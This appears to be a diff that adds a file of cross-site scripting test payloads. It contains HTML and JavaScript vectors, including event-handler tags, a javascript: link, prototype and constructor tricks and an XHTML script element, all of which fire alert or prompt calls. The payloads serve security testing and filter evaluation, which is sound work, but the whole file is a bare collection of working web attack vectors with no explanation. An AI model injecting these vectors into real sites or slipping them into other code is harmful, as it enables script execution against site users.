@@ -1,0 +1,16 @@
+
+<body/onload=&lt;!--&gt;&#10alert(5)>
+<svg/onload=prompt(4)>
+<img/src=x onerror=prompt(3)>
+<textarea autofocus onfocus=prompt(2)></textarea>
+<a href=javascript:alert(1)>XSS</a>
+
+<script>
+__proto__.alert.call(this, 6)
+([]+[]).link.constructor("return this")().alert.call(this, 7)
+</script>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<script xmlns="http://www.w3.org/1999/xhtml">
+  alert(8)
+</script>
